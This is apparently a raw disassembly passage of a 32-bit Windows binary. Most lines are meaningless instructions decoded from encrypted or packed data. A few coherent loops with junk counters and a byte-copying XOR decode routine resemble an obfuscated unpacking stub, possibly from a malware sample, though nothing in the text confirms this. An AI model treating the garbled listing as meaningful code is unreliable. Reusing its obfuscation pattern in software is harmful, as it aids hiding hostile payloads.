  40f315:	loop   0x40f2ad
  40f317:	(bad)  
  40f318:	lods   al,BYTE PTR ds:[esi]
  40f319:	(bad)  
  40f31b:	add    eax,0x6c0ad43f
  40f320:	rcl    DWORD PTR [esi+0xc],cl
  40f323:	mov    dl,0xa9
  40f325:	rol    edx,0x86
  40f328:	ret    
  40f329:	inc    ebp
  40f32a:	mov    edx,0xebddd4b6
  40f32f:	cmp    BYTE PTR [esi+eiz*2],0x90
  40f333:	jae    0x40f3a2
  40f335:	fisub  WORD PTR ds:0x7432141a
  40f33b:	push   ebx
  40f33c:	mov    cl,0xc3
  40f33e:	sbb    al,0x2c
  40f340:	ret    
  40f341:	cmp    eax,0xfa1abb10
  40f346:	jl     0x40f2d4
  40f348:	ret    
  40f349:	arpl   WORD PTR [ebp+0x462bef37],bx
  40f34f:	jle    0x40f39c
  40f351:	pop    ebp
  40f352:	(bad)  
  40f353:	lahf   
  40f354:	out    dx,al
  40f355:	push   0x71f65174
  40f35a:	xchg   ax,ax
  40f35c:	shl    DWORD PTR [ecx],1
  40f35e:	cli    
  40f35f:	mov    esp,0x4e6d79aa
  40f364:	inc    edi
  40f365:	lods   eax,DWORD PTR ds:[esi]
  40f366:	mov    eax,0xa9d28788
  40f36b:	jmp    eax
  40f36d:	dec    edi
  40f36e:	cmc    
  40f36f:	outs   dx,BYTE PTR ds:[esi]
  40f370:	scas   eax,DWORD PTR es:[edi]
  40f371:	pop    eax
  40f372:	lea    esi,[esi-0x12]
  40f375:	sub    al,0x67
  40f377:	in     al,dx
  40f378:	and    edx,DWORD PTR [edx+0x63]
  40f37b:	xchg   ebp,eax
  40f37c:	xor    ch,BYTE PTR ds:0xf32deb90
  40f382:	mov    eax,0xf89c8531
  40f387:	and    DWORD PTR ds:0x433827,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x2c321439]
  40f540:	call   0x7d7c:0x7e7eacd4
  40f547:	jle    0x40f5c7
  40f549:	int3   
  40f54a:	pop    ecx
  40f54b:	add    edi,DWORD PTR [edi+0x3234cb9b]
  40f551:	jecxz  0x40f5bb
  40f553:	pop    ds
  40f554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f555:	xchg   edx,eax
  40f556:	pop    es
  40f557:	pop    edx
  40f558:	dec    DWORD PTR [edx-0x5a53cb52]
  40f55e:	(bad)  
  40f55f:	jp     0x40f513
  40f561:	inc    esi
  40f562:	sar    eax,1
  40f564:	dec    esi
  40f565:	ins    DWORD PTR es:[edi],dx
  40f566:	push   cs
  40f567:	fcmovu st,st(6)
  40f569:	push   esi
  40f56a:	ret    
  40f56b:	into   
  40f56c:	ja     0x40f52b
  40f56e:	inc    ebp
  40f56f:	sub    al,0x1d
  40f571:	in     al,dx
  40f572:	cmp    BYTE PTR [ebp+0x70],ah
  40f575:	pop    esi
  40f576:	out    0x7,al
  40f578:	mov    ebp,0xff93af7e
  40f57d:	push   esp
  40f57e:	cdq    
  40f57f:	bound  edi,QWORD PTR [edx+0x43]
  40f582:	xor    al,0x22
  40f585:	xchg   edi,eax
  40f586:	shl    DWORD PTR [ecx+0x43572c4f],1
  40f58c:	xchg   ebx,eax
  40f58d:	push   edi
  40f58e:	not    BYTE PTR [esi+0x6a]
  40f591:	xchg   edi,eax
  40f592:	inc    esp
  40f593:	push   esi
  40f594:	out    dx,eax
  40f595:	pop    edx
  40f596:	data16 sub cl,BYTE PTR [ebp-0x744b4bf]
  40f59d:	(bad)  
  40f59e:	mov    ch,0xe1
  40f5a0:	pop    ebp
  40f5a1:	push   0xf4e4926c
  40f5a6:	dec    ecx
  40f5a7:	lahf   
  40f5a8:	or     esp,DWORD PTR [ecx-0x4d246316]
  40f5ae:	fwait
  40f5af:	jge    0x40f53e
  40f5b1:	int    0xcd
  40f5b3:	mov    bh,0x10
  40f5b5:	mov    esi,0x43f2f20
  40f5ba:	neg    DWORD PTR [ecx+0x14400603]
  40f5c0:	jb     0x40f5f7
  40f5c2:	bswap  edi
  40f5c4:	and    DWORD PTR [eax],eax
  40f5c6:	push   esi
  40f5c7:	sub    bl,BYTE PTR ds:0xee35cfc6
  40f5cd:	stc    
  40f5ce:	dec    edx
  40f5cf:	push   edx
  40f5d0:	sub    DWORD PTR [edx+0x2192d43],0x197aeb63
  40f5da:	sbb    DWORD PTR [edi],esi
  40f5dc:	cs xchg esi,eax
  40f5de:	outs   dx,BYTE PTR ds:[esi]
  40f5df:	cmp    BYTE PTR [esi+0xa3596f6],ah
  40f5e5:	aas    
  40f5e6:	(bad)  
  40f5e7:	cli    
  40f5e8:	btr    DWORD PTR [ecx-0x64],ecx
  40f5ec:	push   eax
  40f5ed:	test   BYTE PTR [edx-0x19],bl
  40f5f0:	cmp    BYTE PTR [edi+eax*4-0x7fb10923],0xeb
  40f5f8:	mov    al,ds:0x564a53c8
  40f5fd:	sbb    DWORD PTR [ebp-0x1611c20c],esp
  40f603:	fidivr DWORD PTR [ecx+0x16]
  40f606:	setbe  al
  40f609:	rcr    DWORD PTR [eax+eax*8-0xe],1
  40f60d:	daa    
  40f60e:	dec    eax
  40f60f:	stos   DWORD PTR es:[edi],eax
  40f610:	inc    eax
  40f611:	je     0x40f683
  40f613:	xor    eax,0x1f8b36e
  40f618:	add    dh,al
  40f61a:	inc    esp
  40f61b:	or     BYTE PTR gs:[ebp+0x13],0x9
  40f620:	pop    ecx
  40f621:	ret    
  40f622:	js     0x40f5db
  40f624:	stos   BYTE PTR es:[edi],al
  40f625:	sub    edx,DWORD PTR [esi-0x6b4dea3]
  40f62b:	adc    DWORD PTR [eax+0x28],0x8f3bdf01
  40f632:	arpl   WORD PTR [edx+eax*4+0x23],si
  40f636:	xor    DWORD PTR [edi-0x7c],ebx
  40f639:	fiadd  WORD PTR [esi-0x7b888fa8]
  40f63f:	sar    BYTE PTR [ebx],0x94
  40f642:	jle    0x40f604
  40f644:	pop    ebp
  40f645:	add    bh,BYTE PTR [ecx]
  40f647:	and    ecx,DWORD PTR [edi+0x1]
  40f64a:	jl     0x40f63e
  40f64c:	inc    esp
  40f64d:	js     0x40f663
  40f64f:	inc    ecx
  40f650:	adc    ebx,DWORD PTR [eax+eiz*8]
  40f653:	ja     0x40f645
  40f655:	rcl    edi,0x81
  40f658:	or     al,BYTE PTR [ecx+0x3b4258fc]
  40f65e:	adc    eax,0x70a3829f
  40f663:	dec    esi
  40f664:	cmp    BYTE PTR [eax],ah
  40f666:	xor    DWORD PTR [eax],0xffffff99
  40f669:	stos   DWORD PTR es:[edi],eax
  40f66a:	int    0xa1
  40f66c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f66d:	fiadd  DWORD PTR [esi]
  40f66f:	mov    eax,0x763cafbe
  40f674:	mov    esp,0x30f656bf
  40f679:	mov    dh,BYTE PTR [ebp+0x21]
  40f67c:	clc    
  40f67d:	lock dec esp
  40f67f:	sbb    ah,ah
  40f681:	call   0xdcdf:0x5db8541e
  40f688:	or     al,0xdd
  40f68a:	add    al,0xc4
  40f68c:	inc    ecx
  40f68d:	cli    
  40f68e:	sub    BYTE PTR [edx+ebp*8+0x679dc3ec],cl
  40f695:	test   eax,0xbf48825f
  40f69a:	add    BYTE PTR [ebx+0x7aa730bf],cl
  40f6a0:	bound  ebx,QWORD PTR ds:0x22f0d6a4
  40f6a6:	fsubr  QWORD PTR [eax]
  40f6a8:	xchg   ebp,eax
  40f6a9:	ss mov eax,cs:0xd8eb95c8
  40f6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6b1:	push   edi
  40f6b2:	aam    0xc3
  40f6b4:	(bad)  
  40f6b5:	sti    
  40f6b6:	mov    esi,0xfeaea0f6
  40f6bb:	fisttp DWORD PTR [esi+0x20]
  40f6be:	sbb    al,0xaf
  40f6c0:	(bad)  
  40f6c1:	in     al,dx
  40f6c2:	xchg   esi,eax
  40f6c3:	dec    ebx
  40f6c4:	(bad)  
  40f6c5:	sar    BYTE PTR [eax],0xee
  40f6c8:	stos   DWORD PTR es:[edi],eax
  40f6c9:	lds    esi,FWORD PTR [ecx]
  40f6cb:	sti    
  40f6cc:	mov    DWORD PTR [edi],edx
  40f6ce:	stos   BYTE PTR es:[edi],al
  40f6cf:	dec    ebx
  40f6d0:	inc    esp
  40f6d1:	mov    DWORD PTR [edi-0x76],edi
  40f6d4:	pusha  
  40f6d5:	jge    0x40f6b7
  40f6d7:	mov    dl,0x19
  40f6d9:	pop    edx
  40f6da:	cmc    
  40f6db:	push   ecx
  40f6dc:	mov    esi,0x96b12285
  40f6e1:	mov    cl,0x7c
  40f6e3:	(bad)  
  40f6e4:	push   ss
  40f6e5:	xchg   edi,eax
  40f6e6:	pop    edx
  40f6e7:	push   eax
  40f6e8:	push   0x7c56b280
  40f6ed:	push   edx
  40f6ee:	rol    DWORD PTR [edi+0xa],0xa5
  40f6f2:	icebp  
  40f6f3:	icebp  
  40f6f4:	mov    ds:0x8b166fcf,eax
  40f6f9:	and    BYTE PTR [esp+ebp*2-0x1a],ah
  40f6fd:	aam    0x2c
  40f6ff:	test   al,0x3c
  40f701:	arpl   WORD PTR [esi],bx
  40f703:	repz shr DWORD PTR [esi],1
  40f706:	and    eax,0xdc7f874
  40f70b:	mov    al,ds:0xf1c0c78
  40f710:	test   DWORD PTR [ebx],0xb0cb3b1f
  40f716:	fisttp WORD PTR [ecx-0x683e565]
  40f71c:	addr16 out 0x20,al
  40f71f:	fs (bad) 
  40f721:	jmp    0xefd9:0x77344017
  40f728:	cwde   
  40f729:	push   cs
  40f72a:	pop    esp
  40f72b:	inc    esp
  40f72c:	lods   eax,DWORD PTR ds:[esi]
  40f72d:	(bad)  
  40f72e:	leave  
  40f72f:	mov    esi,0x4dd3cf6c
  40f734:	cwde   
  40f735:	repnz mov BYTE PTR cs:[esi],ah
  40f739:	popf   
  40f73a:	lock std 
  40f73c:	pushf  
  40f73d:	aam    0xe2
  40f73f:	mov    ecx,DWORD PTR [esi]
  40f741:	sub    al,0xc7
  40f743:	or     BYTE PTR [esi+0x3aa2c913],0xa2
  40f74a:	and    DWORD PTR ds:0xbd0fe1f1,ebp
  40f750:	dec    ecx
  40f751:	rcl    BYTE PTR [ebx+ecx*4],cl
  40f754:	xchg   edi,eax
  40f755:	cmp    bh,BYTE PTR [eax]
  40f757:	jnp    0x40f790
  40f759:	mov    esp,0xa4af76e
  40f75e:	push   0xffffffd5
  40f760:	imul   esi,DWORD PTR [esp+ebp*4+0x56],0xff1392db
  40f768:	xchg   edx,eax
  40f769:	in     eax,dx
  40f76a:	mov    dh,0xa0
  40f76c:	sbb    ch,BYTE PTR [edx-0x6eca4503]
  40f772:	out    0x66,eax
  40f774:	sub    BYTE PTR [ebx+0x4207eed7],0x35
  40f77b:	repnz sub eax,edx
  40f77e:	es mov edi,0xef08dae9
  40f784:	mov    al,0xf8
  40f786:	imul   ch
  40f788:	clc    
  40f789:	sub    eax,DWORD PTR [edi]
  40f78b:	test   eax,0xa8e2b03d
  40f790:	pop    ss
  40f791:	sbb    BYTE PTR [esi-0x50],dh
  40f794:	out    dx,al
  40f795:	pushf  
  40f796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f797:	xchg   esp,eax
  40f798:	cmp    edx,0x8ca851a5
  40f79e:	push   edi
  40f79f:	js     0x40f78e
  40f7a1:	adc    eax,0x4b1d98cf
  40f7a6:	(bad)  
  40f7a8:	xchg   DWORD PTR [edx-0x72c077fb],ebx
  40f7ae:	cmp    BYTE PTR [eax+edi*8-0x699bff26],cl
  40f7b5:	(bad)  
  40f7b6:	adc    al,0x21
  40f7b8:	adc    al,0x94
  40f7ba:	adc    edi,DWORD PTR [esi]
  40f7bc:	stos   DWORD PTR es:[edi],eax
  40f7bd:	sub    ebp,edi
  40f7bf:	sti    
  40f7c0:	dec    eax
  40f7c1:	mov    ebx,0x8c1f2db4
  40f7c6:	dec    edx
  40f7c7:	or     eax,0xbc0e3284
  40f7cc:	(bad)
  40f7cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d0:	jo     0x40f7f5
  40f7d2:	jmp    0x6a99:0xfd5fdc03
  40f7d9:	in     eax,dx
  40f7da:	cmp    eax,0x91654097
  40f7df:	pop    ds
  40f7e0:	mov    al,gs:0x5bd0ec4c
  40f7e6:	in     al,0x20
  40f7e8:	clc    
  40f7e9:	mov    BYTE PTR [ecx],cl
  40f7eb:	sahf   
  40f7ec:	aas    
  40f7ed:	arpl   WORD PTR [ecx-0xd06adb2],cx
  40f7f3:	and    DWORD PTR [eax],esi
  40f7f5:	mov    ss,WORD PTR [edi-0x6e]
  40f7f8:	cli    
  40f7f9:	or     edi,ebx
  40f7fb:	nop
  40f7fc:	xchg   DWORD PTR [edx+0x11],ebx
  40f7ff:	sub    al,0x5e
  40f801:	sub    ebp,DWORD PTR [ecx-0x23]
  40f804:	shl    BYTE PTR [eax-0x30],1
  40f807:	sbb    BYTE PTR [ebx],dh
  40f809:	dec    edi
  40f80a:	shl    esi,0xbe
  40f80d:	mov    edx,0xdc91047c
  40f812:	pusha  
  40f813:	popf   
  40f814:	mov    esi,0x943e5a89
  40f819:	or     BYTE PTR [ebp-0x1330ea45],dh
  40f81f:	les    ebp,FWORD PTR [eax-0x34]
  40f822:	mov    cl,0x6
  40f824:	cmp    edx,ebp
  40f826:	and    cl,cl
  40f828:	aas    
  40f829:	xor    BYTE PTR [esi],dl
  40f82b:	sub    esi,DWORD PTR [eax+0x5c]
  40f82e:	pop    ebx
  40f82f:	sbb    DWORD PTR [edx+0x70832361],eax
  40f835:	sub    ch,ch
  40f837:	aaa    
  40f838:	mov    edx,0x5b5d4a88
  40f83d:	push   0x39
  40f83f:	test   eax,0xe3460b61
  40f844:	not    DWORD PTR [eax+0x1521dcb3]
  40f84a:	add    BYTE PTR [ebx],dh
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xe8f6d93f
  40f897:	mov    bl,0xd2
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	mov    BYTE PTR [esi],dl
  40f8a2:	dec    ecx
  40f8a3:	retf   0x203d
  40f8a6:	and    eax,0x84ff50d
  40f8ab:	mov    ?,WORD PTR [esp+edi*1+0xf9e1417]
  40f8b2:	xchg   esi,eax
  40f8b3:	xchg   edx,eax
  40f8b4:	dec    esp
  40f8b5:	jne    0x40f841
  40f8b7:	test   DWORD PTR [edx+0x10be70ce],eax
  40f8bd:	mov    WORD PTR [edx+esi*8-0x3aea49e7],ss
  40f8c4:	repnz test al,0xa6
  40f8c7:	xchg   ebp,eax
  40f8c8:	fadd   DWORD PTR [edi-0x3833df71]
  40f8ce:	xor    BYTE PTR [edi-0x60],bl
  40f8d1:	pop    esp
  40f8d2:	sahf   
  40f8d3:	rol    DWORD PTR [ebp-0x49037420],1
  40f8d9:	xor    al,0x44
  40f8db:	inc    eax
  40f8dc:	inc    edx
  40f8dd:	push   edi
  40f8de:	call   0x9b93f2d7
  40f8e3:	data16 jo 0x40f8a1
  40f8e6:	mov    esp,0xb91fb1e6
  40f8eb:	xchg   edi,eax
  40f8ec:	adc    al,0x7e
  40f8ee:	mov    ebx,0xc4af3a9f
  40f8f3:	mov    esp,0x14126eec
  40f8f8:	inc    esp
  40f8f9:	xor    ah,BYTE PTR ds:0xba64b739
  40f8ff:	jmp    0x40f8e0
  40f901:	jge    0x40f8c4
  40f903:	ret    
  40f904:	jb     0x40f8fc
  40f906:	int    0x48
  40f908:	stos   DWORD PTR es:[edi],eax
  40f909:	dec    eax
  40f90a:	add    eax,0x6e6a288d
  40f90f:	(bad)  
  40f910:	cwde   
  40f911:	push   edx
  40f912:	shr    DWORD PTR [ecx+0x54eb9fa1],0x85
  40f919:	push   ds
  40f91a:	lea    eax,[ebx-0x5]
  40f91d:	pmulhuw mm2,QWORD PTR [ebp-0x68]
  40f921:	sub    BYTE PTR [eax],al
  40f923:	and    dh,dh
  40f925:	push   edi
  40f926:	int3   
  40f927:	inc    ebp
  40f928:	dec    esi
  40f929:	imul   edi,ebx,0x62
  40f92c:	add    ebp,DWORD PTR [eax+0x41]
  40f92f:	dec    edx
  40f930:	hlt    
  40f931:	push   es
  40f932:	cs pop ebp
  40f934:	int    0xf3
  40f936:	pop    edx
  40f937:	sub    DWORD PTR ds:0xcdbef5a6,ebx
  40f93d:	add    al,0x6a
  40f93f:	ss es xchg esi,eax
  40f942:	dec    edx
  40f943:	neg    al
  40f945:	jg     0x40f8d5
  40f947:	std    
  40f948:	or     ebx,DWORD PTR [ebx-0x15a5e306]
  40f94e:	mov    WORD PTR [esi],gs
  40f950:	fadd   QWORD PTR [ecx]
  40f952:	(bad)  
  40f953:	ins    BYTE PTR es:[edi],dx
  40f954:	cmp    al,0xe4
  40f956:	dec    edi
  40f957:	mov    edx,0x852b6f57
  40f95c:	mov    BYTE PTR [edx-0x80],bh
  40f95f:	mov    eax,0xfe51dcea
  40f964:	cmp    dl,BYTE PTR fs:[esi-0x6a]
  40f968:	mov    ds:0x98ae47b6,eax
  40f96d:	rol    BYTE PTR [edx-0x5c],0xdc
  40f971:	pop    ebp
  40f972:	add    DWORD PTR [ebx+0x57a23130],esp
  40f978:	outs   dx,BYTE PTR ds:[esi]
  40f979:	xchg   ebx,eax
  40f97a:	mov    eax,es
  40f97c:	xchg   esp,eax
  40f97d:	test   ebp,esp
  40f97f:	jge    0x40f9cf
  40f981:	sbb    DWORD PTR ds:0x241e68a3,0xd5fcb822
  40f98b:	je     0x40f9c7
  40f98d:	test   BYTE PTR fs:[ebp+0x9799e10],0x7d
  40f995:	je     0x40f9fb
  40f997:	adc    dh,BYTE PTR [ebp-0x2d]
  40f99a:	sub    DWORD PTR [ecx],esp
  40f99c:	cld    
  40f99d:	xchg   ecx,eax
  40f99e:	pop    esi
  40f9a0:	push   ss
  40f9a1:	push   eax
  40f9a2:	dec    edi
  40f9a3:	test   al,0xd8
  40f9a5:	aas    
  40f9a6:	inc    esi
  40f9a7:	pop    eax
  40f9a8:	add    al,BYTE PTR [ecx+0x49]
  40f9ab:	dec    eax
  40f9ac:	repnz (bad) 
  40f9ae:	jmp    0x29035d56
  40f9b3:	mov    esi,es
  40f9b5:	and    ebp,DWORD PTR [eax]
  40f9b7:	daa    
  40f9b8:	int3   
  40f9b9:	mov    ebx,0x2a507a5
  40f9be:	jle    0x40f9a2
  40f9c0:	push   es
  40f9c1:	stos   BYTE PTR es:[edi],al
  40f9c2:	in     eax,dx
  40f9c3:	repnz push 0x44368973
  40f9c9:	push   edi
  40f9ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9cb:	and    al,BYTE PTR [esi]
  40f9cd:	pop    ds
  40f9ce:	or     bl,BYTE PTR ds:[esi]
  40f9d1:	pextrw esp,(bad),0xc5
  40f9d3:	arpl   WORD PTR [eax+0x5],cx
  40f9d6:	dec    esi
  40f9d7:	sbb    al,0x6
  40f9d9:	mov    ecx,0x2f8b25d4
  40f9de:	sub    eax,0x1867537
  40f9e3:	out    0x83,al
  40f9e5:	ss dec ebp
  40f9e7:	xor    edi,DWORD PTR [esi-0x686f3003]
  40f9ed:	imul   edx,edx,0x6c9e338a
  40f9f3:	jns    0x40f9df
  40f9f5:	into   
  40f9f6:	lods   al,BYTE PTR ds:[esi]
  40f9f7:	inc    edx
  40f9f8:	pop    edi
  40f9f9:	out    0xdf,eax
  40f9fb:	push   0x6ac011f4
  40fa00:	test   BYTE PTR [ebx],dl
  40fa02:	mov    al,0xd1
  40fa04:	mov    ebp,0x70e7916e
  40fa09:	fistp  DWORD PTR [eax-0x54994602]
  40fa0f:	icebp  
  40fa10:	adc    BYTE PTR [eax+0x79],0xa4
  40fa14:	pusha  
  40fa15:	pop    ebp
  40fa16:	and    dh,BYTE PTR ds:0xc72906a6
  40fa1c:	lock imul ecx,DWORD PTR [edx+0x59f8b4cf],0xf3aad1f2
  40fa27:	push   0xffffff8a
  40fa29:	jecxz  0x40fa1f
  40fa2b:	pop    eax
  40fa2c:	lahf   
  40fa2d:	sbb    ch,bl
  40fa2f:	int3   
  40fa30:	push   cs
  40fa31:	push   eax
  40fa32:	add    bh,al
  40fa34:	dec    eax
  40fa35:	shl    al,0x8c
  40fa38:	cs push edx
  40fa3a:	mov    bl,0xc3
  40fa3c:	je     0x40fa4e
  40fa3e:	fdiv   DWORD PTR [edi+0xc]
  40fa41:	(bad)  
  40fa42:	cmp    BYTE PTR [eax-0x78],dl
  40fa45:	add    cl,BYTE PTR [esp+ebp*8]
  40fa48:	(bad)  
  40fa49:	out    dx,al
  40fa4a:	fwait
  40fa4b:	xor    DWORD PTR [ebx+0x51],edx
  40fa4e:	or     edi,DWORD PTR ds:0x28465c94
  40fa54:	or     cl,BYTE PTR [ebx-0x1595e962]
  40fa5a:	sub    esp,DWORD PTR [ecx+0x7f]
  40fa5d:	retf   0xa3cf
  40fa60:	into   
  40fa61:	xchg   ebp,eax
  40fa62:	dec    esi
  40fa63:	syscall 
  40fa65:	or     bh,BYTE PTR [esi+0xa3fc4cf]
  40fa6b:	test   al,0xd3
  40fa6d:	enter  0x6412,0x72
  40fa71:	mov    bl,0xb6
  40fa73:	rol    BYTE PTR es:[edi],1
  40fa76:	rcr    DWORD PTR [edi+0x2930efd4],0x92
  40fa7d:	mov    ds:0x50ebfdb0,al
  40fa82:	adc    DWORD PTR [ebp-0x644956e7],ebp
  40fa88:	shr    ebp,0xec
  40fa8b:	ror    BYTE PTR [ecx+0x1578d720],1
  40fa91:	cmp    BYTE PTR [edi+eiz*4-0x1afe4a7],dh
  40fa98:	dec    esp
  40fa99:	das    
  40fa9a:	adc    edi,DWORD PTR [edi-0x66]
  40fa9d:	jg     0x40faa2
  40fa9f:	popa   
  40faa0:	dec    ebx
  40faa1:	jl     0x40fa30
  40faa3:	pop    esi
  40faa4:	pop    ebx
  40faa5:	stos   BYTE PTR es:[edi],al
  40faa6:	push   ecx
  40faa7:	bound  esi,QWORD PTR [ebx+0x38]
  40faaa:	mov    ah,0xc1
  40faac:	adc    eax,0xe9b014a7
  40fab1:	mov    ss,WORD PTR [esi]
  40fab3:	dec    edi
  40fab4:	ins    BYTE PTR es:[edi],dx
  40fab5:	mov    cl,0x1f
  40fab7:	iret   
  40fab8:	cmc    
  40fab9:	push   es
  40faba:	fsubr  DWORD PTR [esi]
  40fabc:	fstp   TBYTE PTR ds:0xf9b02d0b
  40fac2:	jl     0x40fa86
  40fac4:	lahf   
  40fac5:	xchg   esp,eax
  40fac6:	pop    ds
  40fac7:	jle    0x40fa83
  40fac9:	push   esp
  40faca:	fs ret 
  40facc:	or     eax,DWORD PTR [ecx]
  40face:	test   eax,0xd973567f
  40fad3:	jae    0x40faeb
  40fad5:	pand   mm4,mm5
  40fad8:	mov    ecx,0xb8a8db28
  40fadd:	call   0xd0e992e9
  40fae2:	adc    eax,DWORD PTR [ecx]
  40fae4:	mov    al,ds:0x2755bcde
  40fae9:	jne    0x40fa8c
  40faeb:	pop    edx
  40faec:	pop    edx
  40faed:	ds into 
  40faef:	and    eax,0x25a6c8dd
  40faf4:	imul   edi,esi,0xcfebe7a7
  40fafa:	pop    ebx
  40fafb:	fisubr DWORD PTR [ebx]
  40fafd:	mov    ch,0x8f
  40fb00:	repz vpsubd ymm0,ymm7,YMMWORD PTR [edx+0x37]
  40fb06:	add    al,al
  40fb08:	(bad)  
  40fb09:	inc    ebx
  40fb0a:	xchg   esp,eax
  40fb0b:	add    ecx,DWORD PTR [ebp+0x18e7832d]
  40fb11:	xor    BYTE PTR [eax],ch
  40fb13:	call   0x5e79:0x16c327c1
  40fb1a:	and    eax,0xb00e3b2d
  40fb1f:	push   0x7b
  40fb21:	in     eax,dx
  40fb22:	stc    
  40fb23:	dec    ebp
  40fb24:	into   
  40fb25:	call   0x569edbf3
  40fb2a:	xchg   edi,eax
  40fb2b:	imul   edi,DWORD PTR [esi],0x18
  40fb2e:	rcl    cl,1
  40fb30:	aaa    
  40fb31:	sbb    al,0xc4
  40fb33:	inc    ebp
  40fb34:	aaa    
  40fb35:	aas    
  40fb36:	sbb    BYTE PTR [edi+0x33a7175f],cl
  40fb3c:	imul   esi,DWORD PTR [edi+ebx*2-0x57],0xaf68ee2b
  40fb44:	inc    ebx
  40fb45:	stos   BYTE PTR es:[edi],al
  40fb46:	ss jl  0x40fb0f
  40fb49:	pop    ebp
  40fb4a:	jae    0x40fb16
  40fb4c:	push   esp
  40fb4d:	mov    ch,0x3f
  40fb4f:	retf   
  40fb50:	jae    0x40fbaa
  40fb52:	dec    ebp
